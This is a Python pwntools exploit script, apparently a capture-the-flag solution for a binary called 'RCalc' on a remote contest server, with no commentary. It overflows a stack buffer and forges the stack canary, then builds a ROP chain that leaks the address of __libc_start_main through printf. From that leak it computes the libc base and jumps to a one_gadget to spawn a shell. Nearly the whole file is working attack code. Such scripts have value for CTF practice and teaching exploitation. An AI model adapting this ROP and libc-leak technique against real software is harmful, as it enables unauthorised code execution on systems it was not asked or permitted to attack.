#!/usr/bin/env python2
from pwn import *
from IPython import embed

#p = gdb.debug('./RCalc', 'break *0x400e39')
#p = process('./RCalc')
p = remote('rcalc.2017.teamrois.cn', 2333)
#p = remote('127.0.0.1', 7122)
e = ELF('./RCalc')

def recv_menu():
	p.recvuntil('choice:')

def add(a, b, save, menu=True):
	if menu:
		recv_menu()
	p.sendline('1')
	p.sendline(str(a))
	p.sendline(str(b))
	p.recvuntil('is ')
	n = p.recvline()
	p.recvuntil('result?')
	p.sendline(save)
	return int(n)

def mul(a, b, save, menu=True):
	if menu:
		recv_menu()
	p.sendline('4')
	p.sendline(str(a))
	p.sendline(str(b))
	p.recvuntil('is ')
	n = p.recvline()
	p.recvuntil('result?')
	p.sendline(save)
	return int(n)

def ex(menu=True):
	if menu:
		recv_menu()
	p.sendline('5')

main = 0x401036
printf = 0x400fc7
pop_rdi_ret = 0x401123
got_libc_start_main = 0x601ff0
one_gadget = 0x4526a
# name + canary + rbp + ret + argv
p.sendline('a'*264 + p64(0) + p64(0x602280) + flat(pop_rdi_ret, got_libc_start_main, printf, word_size=64) + 'b'*32)
for i in range(35):
	add(0, 0, 'yes')

#embed()
p.interactive()
ex(False)
libc_start_main = u64(p.recv().ljust(8, '\x00'))
print hex(libc_start_main), p64(libc_start_main)
libc = libc_start_main - 132928
print hex(libc), p64(libc)

p.sendline(p64(0)*35 + flat(libc+one_gadget, word_size=64))
p.interactive()
